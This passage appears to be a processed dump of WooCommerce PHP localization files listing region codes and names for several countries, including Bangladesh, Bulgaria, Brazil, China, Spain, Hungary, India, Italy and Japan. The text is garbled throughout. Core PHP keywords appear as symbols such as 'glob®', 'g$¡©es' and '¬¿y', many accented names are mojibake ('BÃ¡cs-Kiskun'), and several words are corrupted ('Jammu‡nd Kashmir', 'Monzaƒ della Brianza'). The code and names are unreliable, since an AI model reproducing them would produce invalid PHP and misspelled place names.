( 'Kurigram', 'woocommerce' ),

40 'KUS' => 
__
( 'Kushtia', 'woocommerce' ),

41 'LAK' => 
__
( 'Lakshmipur', 'woocommerce' ),

42 'LAL' => 
__
( 'Lalmonirhat', 'woocommerce' ),

43 'MAD' => 
__
( 'Madaripur', 'woocommerce' ),

44 'MAG' => 
__
( 'Magura', 'woocommerce' ),

45 'MAN' => 
__
( 'Manikganj ', 'woocommerce' ),

46 'MEH' => 
__
( 'Meherpur', 'woocommerce' ),

47 'MOU' => 
__
( 'Moulvibazar', 'woocommerce' ),

48 'MUN' => 
__
( 'Munshiganj', 'woocommerce' ),

49 'MYM' => 
__
( 'Mymensingh', 'woocommerce' ),

50 'NAO' => 
__
( 'Naogaon', 'woocommerce' ),

51 'NAR' => 
__
( 'Narail', 'woocommerce' ),

52 'NARG' => 
__
( 'Narayanganj', 'woocommerce' ),

53 'NARD' => 
__
( 'Narsingdi', 'woocommerce' ),

54 'NAT' => 
__
( 'Natore', 'woocommerce' ),

55 'NAW' => 
__
( 'Nawabganj', 'woocommerce' ),

56 'NET' => 
__
( 'Netrakona', 'woocommerce' ),

57 'NIL' => 
__
( 'Nilphamari', 'woocommerce' ),

58 'NOA' => 
__
( 'Noakhali', 'woocommerce' ),

59 'PAB' => 
__
( 'Pabna', 'woocommerce' ),

60 'PAN' => 
__
( 'Panchagarh', 'woocommerce' ),

61 'PAT' => 
__
( 'Patuakhali', 'woocommerce' ),

62 'PIR' => 
__
( 'Pirojpur', 'woocommerce' ),

63 'RAJB' => 
__
( 'Rajbari', 'woocommerce' ),

64 'RAJ' => 
__
( 'Rajshahi', 'woocommerce' ),

65 'RAN' => 
__
( 'Rangamati', 'woocommerce' ),

66 'RANP' => 
__
( 'Rangpur', 'woocommerce' ),

67 'SAT' => 
__
( 'Satkhira', 'woocommerce' ),

68 'SHA' => 
__
( 'Shariatpur', 'woocommerce' ),

69 'SHE' => 
__
( 'Sherpur', 'woocommerce' ),

70 'SIR' => 
__
( 'Sirajganj', 'woocommerce' ),

71 'SUN' => 
__
( 'Sunamganj', 'woocommerce' ),

72 'SYL' => 
__
( 'Sylhet', 'woocommerce' ),

73 'TAN' => 
__
( 'Tangail', 'woocommerce' ),

74 'THA' => 
__
( 'Thakurgaon', 'woocommerce' )

	@i18n/states/BG.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['BG'] = 
¬¿y
(

13 'BG-01' => 
__
( 'Blagoevgrad', 'woocommerce' ),

14 'BG-02' => 
__
( 'Burgas', 'woocommerce' ),

15 'BG-08' => 
__
( 'Dobrich', 'woocommerce' ),

16 'BG-07' => 
__
( 'Gabrovo', 'woocommerce' ),

17 'BG-26' => 
__
( 'Haskovo', 'woocommerce' ),

18 'BG-09' => 
__
( 'Kardzhali', 'woocommerce' ),

19 'BG-10' => 
__
( 'Kyustendil', 'woocommerce' ),

20 'BG-11' => 
__
( 'Lovech', 'woocommerce' ),

21 'BG-12' => 
__
( 'Montana', 'woocommerce' ),

22 'BG-13' => 
__
( 'Pazardzhik', 'woocommerce' ),

23 'BG-14' => 
__
( 'Pernik', 'woocommerce' ),

24 'BG-15' => 
__
( 'Pleven', 'woocommerce' ),

25 'BG-16' => 
__
( 'Plovdiv', 'woocommerce' ),

26 'BG-17' => 
__
( 'Razgrad', 'woocommerce' ),

27 'BG-18' => 
__
( 'Ruse', 'woocommerce' ),

28 'BG-27' => 
__
( 'Shumen', 'woocommerce' ),

29 'BG-19' => 
__
( 'Silistra', 'woocommerce' ),

30 'BG-20' => 
__
( 'Sliven', 'woocommerce' ),

31 'BG-21' => 
__
( 'Smolyan', 'woocommerce' ),

32 'BG-23' => 
__
( 'Sofia', 'woocommerce' ),

33 'BG-22' => 
__
( 'Sofia-Grad', 'woocommerce' ),

34 'BG-24' => 
__
( 'Stara Zagora', 'woocommerce' ),

35 'BG-25' => 
__
( 'Targovishte', 'woocommerce' ),

36 'BG-03' => 
__
( 'Varna', 'woocommerce' ),

37 'BG-04' => 
__
( 'Veliko Tarnovo', 'woocommerce' ),

38 'BG-05' => 
__
( 'Vidin', 'woocommerce' ),

39 'BG-06' => 
__
( 'Vratsa', 'woocommerce' ),

40 'BG-28' => 
__
( 'Yambol', 'woocommerce' ),

	@i18n/states/BR.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['BR'] = 
¬¿y
(

13 'AC' => 
__
( 'Acre', 'woocommerce' ),

14 'AL' => 
__
( 'Alagoas', 'woocommerce' ),

15 'AP' => 
__
( 'Amap&aacute;', 'woocommerce' ),

16 'AM' => 
__
( 'Amazonas', 'woocommerce' ),

17 'BA' => 
__
( 'Bahia', 'woocommerce' ),

18 'CE' => 
__
( 'Cear&aacute;', 'woocommerce' ),

19 'DF' => 
__
( 'Distrito Federal', 'woocommerce' ),

20 'ES' => 
__
( 'Esp&iacute;rito Santo', 'woocommerce' ),

21 'GO' => 
__
( 'Goi&aacute;s', 'woocommerce' ),

22 'MA' => 
__
( 'Maranh&atilde;o', 'woocommerce' ),

23 'MT' => 
__
( 'Mato Grosso', 'woocommerce' ),

24 'MS' => 
__
( 'Mato Grosso do Sul', 'woocommerce' ),

25 'MG' => 
__
( 'Minas Gerais', 'woocommerce' ),

26 'PA' => 
__
( 'Par&aacute;', 'woocommerce' ),

27 'PB' => 
__
( 'Para&iacute;ba', 'woocommerce' ),

28 'PR' => 
__
( 'Paran&aacute;', 'woocommerce' ),

29 'PE' => 
__
( 'Pernambuco', 'woocommerce' ),

30 'PI' => 
__
( 'Piau&iacute;', 'woocommerce' ),

31 'RJ' => 
__
( 'Rio de Janeiro', 'woocommerce' ),

32 'RN' => 
__
( 'Rio Grande do Norte', 'woocommerce' ),

33 'RS' => 
__
( 'Rio Grande do Sul', 'woocommerce' ),

34 'RO' => 
__
( 'Rond&ocirc;nia', 'woocommerce' ),

35 'RR' => 
__
( 'Roraima', 'woocommerce' ),

36 'SC' => 
__
( 'Santa Catarina', 'woocommerce' ),

37 'SP' => 
__
( 'S&atilde;o Paulo', 'woocommerce' ),

38 'SE' => 
__
( 'Sergipe', 'woocommerce' ),

39 'TO' => 
__
( 'Tocantins', 'woocommerce' )

	@i18n/states/CA.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['CA'] = 
¬¿y
(

13 'AB' => 
__
( 'Alberta', 'woocommerce' ),

14 'BC' => 
__
( 'British Columbia', 'woocommerce' ),

15 'MB' => 
__
( 'Manitoba', 'woocommerce' ),

16 'NB' => 
__
( 'New Brunswick', 'woocommerce' ),

17 'NL' => 
__
( 'Newfoundland', 'woocommerce' ),

18 'NT' => 
__
( 'Northwest Territories', 'woocommerce' ),

19 'NS' => 
__
( 'Nova Scotia', 'woocommerce' ),

20 'NU' => 
__
( 'Nunavut', 'woocommerce' ),

21 'ON' => 
__
( 'Ontario', 'woocommerce' ),

22 'PE' => 
__
( 'Prince Edward Island', 'woocommerce' ),

23 'QC' => 
__
( 'Quebec', 'woocommerce' ),

24 'SK' => 
__
( 'Saskatchewan', 'woocommerce' ),

25 'YT' => 
__
( 'Yukon Territory', 'woocommerce' )

	@i18n/states/CN.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['CN'] = 
¬¿y
(

13 'CN1' => 
__
( 'Yunnan / &#20113;&#21335;', 'woocommerce' ),

14 'CN2' => 
__
( 'Beijing / &#21271;&#20140;', 'woocommerce' ),

15 'CN3' => 
__
( 'Tianjin / &#22825;&#27941;', 'woocommerce' ),

16 'CN4' => 
__
( 'Hebei / &#27827;&#21271;', 'woocommerce' ),

17 'CN5' => 
__
( 'Shanxi / &#23665;&#35199;', 'woocommerce' ),

18 'CN6' => 
__
( 'Inner Mongolia / &#20839;&#33945;&#21476;', 'woocommerce' ),

19 'CN7' => 
__
( 'Liaoning / &#36797;&#23425;', 'woocommerce' ),

20 'CN8' => 
__
( 'Jilin / &#21513;&#26519;', 'woocommerce' ),

21 'CN9' => 
__
( 'Heilongjiang / &#40657;&#40857;&#27743;', 'woocommerce' ),

22 'CN10' => 
__
( 'Shanghai / &#19978;&#28023;', 'woocommerce' ),

23 'CN11' => 
__
( 'Jiangsu / &#27743;&#33487;', 'woocommerce' ),

24 'CN12' => 
__
( 'Zhejiang / &#27993;&#27743;', 'woocommerce' ),

25 'CN13' => 
__
( 'Anhui / &#23433;&#24509;', 'woocommerce' ),

26 'CN14' => 
__
( 'Fujian / &#31119;&#24314;', 'woocommerce' ),

27 'CN15' => 
__
( 'Jiangxi / &#27743;&#35199;', 'woocommerce' ),

28 'CN16' => 
__
( 'Shandong / &#23665;&#19996;', 'woocommerce' ),

29 'CN17' => 
__
( 'Henan / &#27827;&#21335;', 'woocommerce' ),

30 'CN18' => 
__
( 'Hubei / &#28246;&#21271;', 'woocommerce' ),

31 'CN19' => 
__
( 'Hunan / &#28246;&#21335;', 'woocommerce' ),

32 'CN20' => 
__
( 'Guangdong / &#24191;&#19996;', 'woocommerce' ),

33 'CN21' => 
__
( 'Guangxi Zhuang / &#24191;&#35199;&#22766;&#26063;', 'woocommerce' ),

34 'CN22' => 
__
( 'Hainan / &#28023;&#21335;', 'woocommerce' ),

35 'CN23' => 
__
( 'Chongqing / &#37325;&#24198;', 'woocommerce' ),

36 'CN24' => 
__
( 'Sichuan / &#22235;&#24029;', 'woocommerce' ),

37 'CN25' => 
__
( 'Guizhou / &#36149;&#24030;', 'woocommerce' ),

38 'CN26' => 
__
( 'Shaanxi / &#38485;&#35199;', 'woocommerce' ),

39 'CN27' => 
__
( 'Gansu / &#29976;&#32899;', 'woocommerce' ),

40 'CN28' => 
__
( 'Qinghai / &#38738;&#28023;', 'woocommerce' ),

41 'CN29' => 
__
( 'Ningxia Hui / &#23425;&#22799;', 'woocommerce' ),

42 'CN30' => 
__
( 'Macau / &#28595;&#38376;', 'woocommerce' ),

43 'CN31' => 
__
( 'Tibet / &#35199;&#34255;', 'woocommerce' ),

44 'CN32' => 
__
( 'Xinjiang / &#26032;&#30086;', 'woocommerce' )

	@i18n/states/ES.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
["ES"] = 
¬¿y
(

13 'C' => 
__
('A Coru&ntilde;a', 'woocommerce'),

14 'VI' => 
__
('Araba/&Aacute;lava', 'woocommerce'),

15 'AB' => 
__
('Albacete', 'woocommerce'),

16 'A' => 
__
('Alicante', 'woocommerce'),

17 'AL' => 
__
('Almer&iacute;a', 'woocommerce'),

18 'O' => 
__
('Asturias', 'woocommerce'),

19 'AV' => 
__
('&Aacute;vila', 'woocommerce'),

20 'BA' => 
__
('Badajoz', 'woocommerce'),

21 'PM' => 
__
('Baleares', 'woocommerce'),

22 'B' => 
__
('Barcelona', 'woocommerce'),

23 'BU' => 
__
('Burgos', 'woocommerce'),

24 'CC' => 
__
('C&aacute;ceres', 'woocommerce'),

25 'CA' => 
__
('C&aacute;diz', 'woocommerce'),

26 'S' => 
__
('Cantabria', 'woocommerce'),

27 'CS' => 
__
('Castell&oacute;n', 'woocommerce'),

28 'CE' => 
__
('Ceuta', 'woocommerce'),

29 'CR' => 
__
('Ciudad Real', 'woocommerce'),

30 'CO' => 
__
('C&oacute;rdoba', 'woocommerce'),

31 'CU' => 
__
('Cuenca', 'woocommerce'),

32 'GI' => 
__
('Girona', 'woocommerce'),

33 'GR' => 
__
('Granada', 'woocommerce'),

34 'GU' => 
__
('Guadalajara', 'woocommerce'),

35 'SS' => 
__
('Gipuzkoa', 'woocommerce'),

36 'H' => 
__
('Huelva', 'woocommerce'),

37 'HU' => 
__
('Huesca', 'woocommerce'),

38 'J' => 
__
('Ja&eacute;n', 'woocommerce'),

39 'LO' => 
__
('La Rioja', 'woocommerce'),

40 'GC' => 
__
('Las Palmas', 'woocommerce'),

41 'LE' => 
__
('Le&oacute;n', 'woocommerce'),

42 'L' => 
__
('Lleida', 'woocommerce'),

43 'LU' => 
__
('Lugo', 'woocommerce'),

44 'M' => 
__
('Madrid', 'woocommerce'),

45 'MA' => 
__
('M&aacute;laga', 'woocommerce'),

46 'ML' => 
__
('Melilla', 'woocommerce'),

47 'MU' => 
__
('Murcia', 'woocommerce'),

48 'NA' => 
__
('Navarra', 'woocommerce'),

49 'OR' => 
__
('Ourense', 'woocommerce'),

50 'P' => 
__
('Palencia', 'woocommerce'),

51 'PO' => 
__
('Pontevedra', 'woocommerce'),

52 'SA' => 
__
('Salamanca', 'woocommerce'),

53 'TF' => 
__
('Santa Cruz de Tenerife', 'woocommerce'),

54 'SG' => 
__
('Segovia', 'woocommerce'),

55 'SE' => 
__
('Sevilla', 'woocommerce'),

56 'SO' => 
__
('Soria', 'woocommerce'),

57 'T' => 
__
('Tarragona', 'woocommerce'),

58 'TE' => 
__
('Teruel', 'woocommerce'),

59 'TO' => 
__
('Toledo', 'woocommerce'),

60 'V' => 
__
('Valencia', 'woocommerce'),

61 'VA' => 
__
('Valladolid', 'woocommerce'),

62 'BI' => 
__
('Bizkaia', 'woocommerce'),

63 'ZA' => 
__
('Zamora', 'woocommerce'),

64 'Z' => 
__
('Zaragoza', 'woocommerce')

	@i18n/states/HK.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['HK'] = 
¬¿y
(

13 'HONG KONG' => 
__
( 'Hong Kong Island', 'woocommerce' ),

14 'KOWLOON' => 
__
( 'Kowloon', 'woocommerce' ),

15 'NEW TERRITORIES' => 
__
( 'New Territories', 'woocommerce' )

	@i18n/states/HU.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['HU'] = 
¬¿y
(

13 'BK' => 
__
( 'BÃ¡cs-Kiskun', 'woocommerce' ),

14 'BE' => 
__
( 'BÃ©kÃ©s', 'woocommerce' ),

15 'BA' => 
__
( 'Baranya', 'woocommerce' ),

16 'BZ' => 
__
( 'Borsod-AbaÃºj-ZemplÃ©n', 'woocommerce' ),

17 'BU' => 
__
( 'Budapest', 'woocommerce' ),

18 'CS' => 
__
( 'CsongrÃ¡d', 'woocommerce' ),

19 'FE' => 
__
( 'FejÃ©r', 'woocommerce' ),

20 'GS' => 
__
( 'GyÅ‘r-Moson-Sopron', 'woocommerce' ),

21 'HB' => 
__
( 'HajdÃº-Bihar', 'woocommerce' ),

22 'HE' => 
__
( 'Heves', 'woocommerce' ),

23 'JN' => 
__
( 'JÃ¡sz-Nagykun-Szolnok', 'woocommerce' ),

24 'KE' => 
__
( 'KomÃ¡rom-Esztergom', 'woocommerce' ),

25 'NO' => 
__
( 'NÃ³grÃ¡d', 'woocommerce' ),

26 'PE' => 
__
( 'Pest', 'woocommerce' ),

27 'SO' => 
__
( 'Somogy', 'woocommerce' ),

28 'SZ' => 
__
( 'Szabolcs-SzatmÃ¡r-Bereg', 'woocommerce' ),

29 'TO' => 
__
( 'Tolna', 'woocommerce' ),

30 'VA' => 
__
( 'Vas', 'woocommerce' ),

31 'VE' => 
__
( 'VeszprÃ©m', 'woocommerce' ),

32 'ZA' => 
__
( 'Zala', 'woocommerce' )

	@i18n/states/HZ.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['HZ'] = 
¬¿y
(

13 'AK' => 
__
( 'Auckland', 'woocommerce' ),

14 'BP' => 
__
( 'Bay of Plenty', 'woocommerce' ),

15 'CT' => 
__
( 'Canterbury', 'woocommerce' ),

16 'HB' => 
__
( 'Hawke&rsquo;s Bay', 'woocommerce' ),

17 'MW' => 
__
( 'Manawatu-Wanganui', 'woocommerce' ),

18 'MB' => 
__
( 'Marlborough', 'woocommerce' ),

19 'NS' => 
__
( 'Nelson', 'woocommerce' ),

20 'NL' => 
__
( 'Northland', 'woocommerce' ),

21 'OT' => 
__
( 'Otago', 'woocommerce' ),

22 'SL' => 
__
( 'Southland', 'woocommerce' ),

23 'TK' => 
__
( 'Taranaki', 'woocommerce' ),

24 'TM' => 
__
( 'Tasman', 'woocommerce' ),

25 'WA' => 
__
( 'Waikato', 'woocommerce' ),

26 'WE' => 
__
( 'Wellington', 'woocommerce' ),

27 'WC' => 
__
( 'West Coast', 'woocommerce' )

	@i18n/states/ID.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['ID'] = 
¬¿y
(

13 'AC' => 
__
( 'Daerah Istimewa Aceh', 'woocommerce' ),

14 'SU' => 
__
( 'Sumatera Utara', 'woocommerce' ),

15 'SB' => 
__
( 'Sumatera Barat', 'woocommerce' ),

16 'RI' => 
__
( 'Riau', 'woocommerce' ),

17 'KR' => 
__
( 'Kepulauan Riau', 'woocommerce' ),

18 'JA' => 
__
( 'Jambi', 'woocommerce' ),

19 'SS' => 
__
( 'Sumatera Selatan', 'woocommerce' ),

20 'BB' => 
__
( 'Bangka Belitung', 'woocommerce' ),

21 'BE' => 
__
( 'Bengkulu', 'woocommerce' ),

22 'LA' => 
__
( 'Lampung', 'woocommerce' ),

23 'JK' => 
__
( 'DKI Jakarta', 'woocommerce' ),

24 'JB' => 
__
( 'Jawa Barat', 'woocommerce' ),

25 'BT' => 
__
( 'Banten', 'woocommerce' ),

26 'JT' => 
__
( 'Jawa Tengah', 'woocommerce' ),

27 'JI' => 
__
( 'Jawa Timur', 'woocommerce' ),

28 'YO' => 
__
( 'Daerah Istimewa Yogyakarta', 'woocommerce' ),

29 'BA' => 
__
( 'Bali', 'woocommerce' ),

30 'NB' => 
__
( 'Nusa Tenggara Barat', 'woocommerce' ),

31 'NT' => 
__
( 'Nusa Tenggara Timur', 'woocommerce' ),

32 'KB' => 
__
( 'Kalimantan Barat', 'woocommerce' ),

33 'KT' => 
__
( 'Kalimantan Tengah', 'woocommerce' ),

34 'KI' => 
__
( 'Kalimantan Timur', 'woocommerce' ),

35 'KS' => 
__
( 'Kalimantan Selatan', 'woocommerce' ),

36 'KU' => 
__
( 'Kalimantan Utara', 'woocommerce' ),

37 'SA' => 
__
( 'Sulawesi Utara', 'woocommerce' ),

38 'ST' => 
__
( 'Sulawesi Tengah', 'woocommerce' ),

39 'SG' => 
__
( 'Sulawesi Tenggara', 'woocommerce' ),

40 'SR' => 
__
( 'Sulawesi Barat', 'woocommerce' ),

41 'SN' => 
__
( 'Sulawesi Selatan', 'woocommerce' ),

42 'GO' => 
__
( 'Gorontalo', 'woocommerce' ),

43 'MA' => 
__
( 'Maluku', 'woocommerce' ),

44 'MU' => 
__
( 'Maluku Utara', 'woocommerce' ),

45 'PA' => 
__
( 'Papua', 'woocommerce' ),

46 'PB' => 
__
( 'Papua Barat', 'woocommerce' )

	@i18n/states/IN.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['IN'] = 
¬¿y
(

13 'AP' => 
__
( 'Andra Pradesh', 'woocommerce' ),

14 'AR' => 
__
( 'Arunachal Pradesh', 'woocommerce' ),

15 'AS' => 
__
( 'Assam', 'woocommerce' ),

16 'BR' => 
__
( 'Bihar', 'woocommerce' ),

17 'CT' => 
__
( 'Chhattisgarh', 'woocommerce' ),

18 'GA' => 
__
( 'Goa', 'woocommerce' ),

19 'GJ' => 
__
( 'Gujarat', 'woocommerce' ),

20 'HR' => 
__
( 'Haryana', 'woocommerce' ),

21 'HP' => 
__
( 'Himachal Pradesh', 'woocommerce' ),

22 'JK' => 
__
( 'Jammu‡nd Kashmir', 'woocommerce' ),

23 'JH' => 
__
( 'Jharkhand', 'woocommerce' ),

24 'KA' => 
__
( 'Karnataka', 'woocommerce' ),

25 'KL' => 
__
( 'Kerala', 'woocommerce' ),

26 'MP' => 
__
( 'Madhya Pradesh', 'woocommerce' ),

27 'MH' => 
__
( 'Maharashtra', 'woocommerce' ),

28 'MN' => 
__
( 'Manipur', 'woocommerce' ),

29 'ML' => 
__
( 'Meghalaya', 'woocommerce' ),

30 'MZ' => 
__
( 'Mizoram', 'woocommerce' ),

31 'NL' => 
__
( 'Nagaland', 'woocommerce' ),

32 'OR' => 
__
( 'Orissa', 'woocommerce' ),

33 'PB' => 
__
( 'Punjab', 'woocommerce' ),

34 'RJ' => 
__
( 'Rajasthan', 'woocommerce' ),

35 'SK' => 
__
( 'Sikkim', 'woocommerce' ),

36 'TN' => 
__
( 'Tamil Nadu', 'woocommerce' ),

37 'TR' => 
__
( 'Tripura', 'woocommerce' ),

38 'UT' => 
__
( 'Uttaranchal', 'woocommerce' ),

39 'UP' => 
__
( 'Uttar Pradesh', 'woocommerce' ),

40 'WB' => 
__
( 'West Bengal', 'woocommerce' ),

41 'AN' => 
__
( 'Andaman‡nd Nicobar Islands', 'woocommerce' ),

42 'CH' => 
__
( 'Chandigarh', 'woocommerce' ),

43 'DN' => 
__
( 'Dadar‡nd Nagar Haveli', 'woocommerce' ),

44 'DD' => 
__
( 'Daman‡nd Diu', 'woocommerce' ),

45 'DL' => 
__
( 'Delhi', 'woocommerce' ),

46 'LD' => 
__
( 'Lakshadeep', 'woocommerce' ),

47 'PY' => 
__
( 'Pondicherry (Puducherry)', 'woocommerce' )

	@i18n/states/IT.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['IT'] = 
¬¿y
(

13 'AG' => 
__
( 'Agrigento', 'woocommerce' ),

14 'AL' => 
__
( 'Alessandria', 'woocommerce' ),

15 'AN' => 
__
( 'Ancona', 'woocommerce' ),

16 'AO' => 
__
( 'Aosta', 'woocommerce' ),

17 'AR' => 
__
( 'Arezzo', 'woocommerce' ),

18 'AP' => 
__
( 'Ascoli Piceno', 'woocommerce' ),

19 'AT' => 
__
( 'Asti', 'woocommerce' ),

20 'AV' => 
__
( 'Avellino', 'woocommerce' ),

21 'BA' => 
__
( 'Bari', 'woocommerce' ),

22 'BT' => 
__
( 'Barletta-Andria-Trani', 'woocommerce' ),

23 'BL' => 
__
( 'Belluno', 'woocommerce' ),

24 'BN' => 
__
( 'Benevento', 'woocommerce' ),

25 'BG' => 
__
( 'Bergamo', 'woocommerce' ),

26 'BI' => 
__
( 'Biella', 'woocommerce' ),

27 'BO' => 
__
( 'Bologna', 'woocommerce' ),

28 'BZ' => 
__
( 'Bolzano', 'woocommerce' ),

29 'BS' => 
__
( 'Brescia', 'woocommerce' ),

30 'BR' => 
__
( 'Brindisi', 'woocommerce' ),

31 'CA' => 
__
( 'Cagliari', 'woocommerce' ),

32 'CL' => 
__
( 'Caltanissetta', 'woocommerce' ),

33 'CB' => 
__
( 'Campobasso', 'woocommerce' ),

34 'CI' => 
__
( 'Carbonia-Iglesias', 'woocommerce' ),

35 'CE' => 
__
( 'Caserta', 'woocommerce' ),

36 'CT' => 
__
( 'Catania', 'woocommerce' ),

37 'CZ' => 
__
( 'Catanzaro', 'woocommerce' ),

38 'CH' => 
__
( 'Chieti', 'woocommerce' ),

39 'CO' => 
__
( 'Como', 'woocommerce' ),

40 'CS' => 
__
( 'Cosenza', 'woocommerce' ),

41 'CR' => 
__
( 'Cremona', 'woocommerce' ),

42 'KR' => 
__
( 'Crotone', 'woocommerce' ),

43 'CN' => 
__
( 'Cuneo', 'woocommerce' ),

44 'EN' => 
__
( 'Enna', 'woocommerce' ),

45 'FM' => 
__
( 'Fermo', 'woocommerce' ),

46 'FE' => 
__
( 'Ferrara', 'woocommerce' ),

47 'FI' => 
__
( 'Firenze', 'woocommerce' ),

48 'FG' => 
__
( 'Foggia', 'woocommerce' ),

49 'FC' => 
__
( 'ForlÃ¬-Cesena', 'woocommerce' ),

50 'FR' => 
__
( 'Frosinone', 'woocommerce' ),

51 'GE' => 
__
( 'Genova', 'woocommerce' ),

52 'GO' => 
__
( 'Gorizia', 'woocommerce' ),

53 'GR' => 
__
( 'Grosseto', 'woocommerce' ),

54 'IM' => 
__
( 'Imperia', 'woocommerce' ),

55 'IS' => 
__
( 'Isernia', 'woocommerce' ),

56 'SP' => 
__
( 'La Spezia', 'woocommerce' ),

57 'AQ' => 
__
( 'L&apos;Aquila', 'woocommerce' ),

58 'LT' => 
__
( 'Latina', 'woocommerce' ),

59 'LE' => 
__
( 'Lecce', 'woocommerce' ),

60 'LC' => 
__
( 'Lecco', 'woocommerce' ),

61 'LI' => 
__
( 'Livorno', 'woocommerce' ),

62 'LO' => 
__
( 'Lodi', 'woocommerce' ),

63 'LU' => 
__
( 'Lucca', 'woocommerce' ),

64 'MC' => 
__
( 'Macerata', 'woocommerce' ),

65 'MN' => 
__
( 'Mantova', 'woocommerce' ),

66 'MS' => 
__
( 'Massa-Carrara', 'woocommerce' ),

67 'MT' => 
__
( 'Matera', 'woocommerce' ),

68 'ME' => 
__
( 'Messina', 'woocommerce' ),

69 'MI' => 
__
( 'Milano', 'woocommerce' ),

70 'MO' => 
__
( 'Modena', 'woocommerce' ),

71 'MB' => 
__
( 'Monzaƒ della Brianza', 'woocommerce' ),

72 'NA' => 
__
( 'Napoli', 'woocommerce' ),

73 'NO' => 
__
( 'Novara', 'woocommerce' ),

74 'NU' => 
__
( 'Nuoro', 'woocommerce' ),

75 'OT' => 
__
( 'Olbia-Tempio', 'woocommerce' ),

76 'OR' => 
__
( 'Oristano', 'woocommerce' ),

77 'PD' => 
__
( 'Padova', 'woocommerce' ),

78 'PA' => 
__
( 'Palermo', 'woocommerce' ),

79 'PR' => 
__
( 'Parma', 'woocommerce' ),

80 'PV' => 
__
( 'Pavia', 'woocommerce' ),

81 'PG' => 
__
( 'Perugia', 'woocommerce' ),

82 'PU' => 
__
( 'Pesaroƒ Urbino', 'woocommerce' ),

83 'PE' => 
__
( 'Pescara', 'woocommerce' ),

84 'PC' => 
__
( 'Piacenza', 'woocommerce' ),

85 'PI' => 
__
( 'Pisa', 'woocommerce' ),

86 'PT' => 
__
( 'Pistoia', 'woocommerce' ),

87 'PN' => 
__
( 'Pordenone', 'woocommerce' ),

88 'PZ' => 
__
( 'Potenza', 'woocommerce' ),

89 'PO' => 
__
( 'Prato', 'woocommerce' ),

90 'RG' => 
__
( 'Ragusa', 'woocommerce' ),

91 'RA' => 
__
( 'Ravenna', 'woocommerce' ),

92 'RC' => 
__
( 'Reggio Calabria', 'woocommerce' ),

93 'RE' => 
__
( 'Reggio Emilia', 'woocommerce' ),

94 'RI' => 
__
( 'Rieti', 'woocommerce' ),

95 'RN' => 
__
( 'Rimini', 'woocommerce' ),

96 'RM' => 
__
( 'Roma', 'woocommerce' ),

97 'RO' => 
__
( 'Rovigo', 'woocommerce' ),

98 'SA' => 
__
( 'Salerno', 'woocommerce' ),

99 'VS' => 
__
( 'Medio Campidano', 'woocommerce' ),

100 'SS' => 
__
( 'Sassari', 'woocommerce' ),

101 'SV' => 
__
( 'Savona', 'woocommerce' ),

102 'SI' => 
__
( 'Siena', 'woocommerce' ),

103 'SR' => 
__
( 'Siracusa', 'woocommerce' ),

104 'SO' => 
__
( 'Sondrio', 'woocommerce' ),

105 'TA' => 
__
( 'Taranto', 'woocommerce' ),

106 'TE' => 
__
( 'Teramo', 'woocommerce' ),

107 'TR' => 
__
( 'Terni', 'woocommerce' ),

108 'TO' => 
__
( 'Torino', 'woocommerce' ),

109 'OG' => 
__
( 'Ogliastra', 'woocommerce' ),

110 'TP' => 
__
( 'Trapani', 'woocommerce' ),

111 'TN' => 
__
( 'Trento', 'woocommerce' ),

112 'TV' => 
__
( 'Treviso', 'woocommerce' ),

113 'TS' => 
__
( 'Trieste', 'woocommerce' ),

114 'UD' => 
__
( 'Udine', 'woocommerce' ),

115 'VA' => 
__
( 'Varese', 'woocommerce' ),

116 'VE' => 
__
( 'Venezia', 'woocommerce' ),

117 'VB' => 
__
( 'Verbano-Cusio-Ossola', 'woocommerce' ),

118 'VC' => 
__
( 'Vercelli', 'woocommerce' ),

119 'VR' => 
__
( 'Verona', 'woocommerce' ),

120 'VV' => 
__
( 'Vibo Valentia', 'woocommerce' ),

121 'VI' => 
__
( 'Vicenza', 'woocommerce' ),

122 'VT' => 
__
( 'Viterbo', 'woocommerce' )

	@i18n/states/JP.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['JP'] = 
¬¿y
(

13 'JP01' => 
__
( 'Hokkaido', 'woocommerce' ),

14 'JP02' => 
__
( 'Aomori', 'woocommerce' ),

15 'JP03' => 
__
( 'Iwate', 'woocommerce' ),

16 'JP04' => 
__
( 'Miyagi', 'woocommerce' ),

17 'JP05' => 
__
( 'Akita', 'woocommerce' ),

18 'JP06' => 
__
( 'Yamagata', 'woocommerce' ),

19 'JP07' => 
__
( 'Fukushima', 'woocommerce' ),

20 'JP08' => 
__
( 'Ibaraki', 'woocommerce' ),

21 'JP09' => 
__
( 'Tochigi', 'woocommerce' ),

22 'JP10' => 
__
( 'Gunma', 'woocommerce' ),

23 'JP11' => 
__
( 'Saitama', 'woocommerce' ),

24 'JP12' => 
__
( 'Chiba', 'woocommerce' ),

25 'JP13' => 
__
( 'Tokyo', 'woocommerce' ),

26 'JP14' => 
__
( 'Kanagawa', 'woocommerce' ),

27 'JP15' => 
__
( 'Niigata', 'woocommerce' ),

28 'JP16' => 
__
( 'Toyama', 'woocommerce' ),

29 'JP17' => 
__
( 'Ishikawa', 'woocommerce' ),

30 'JP18' => 
__
( 'Fukui', 'woocommerce' ),

31 'JP19' => 
__
( 'Yamanashi', 'woocommerce' ),

32 'JP20' => 
__
( 'Nagano', 'woocommerce' ),

33 'JP21' => 
__
( 'Gifu', 'woocommerce' ),

34 'JP22' => 
__
( 'Shizuoka', 'woocommerce' ),

35 'JP23' => 
__
( 'Aichi', 'woocommerce' ),

36 'JP24' => 
__
( 'Mie', 'woocommerce' ),

37 'JP25' => 
__
( 'Shiga', 'woocommerce' ),

38 'JP26' => 
__
( 'Kyouto', 'woocommerce' ),

39 'JP27' => 
__
( 'Osaka', 'woocommerce' ),

40 'JP28' => 
__
( 'Hyougo', 'woocommerce' ),

41 'JP29' => 
__
( 'Nara', 'woocommerce' ),

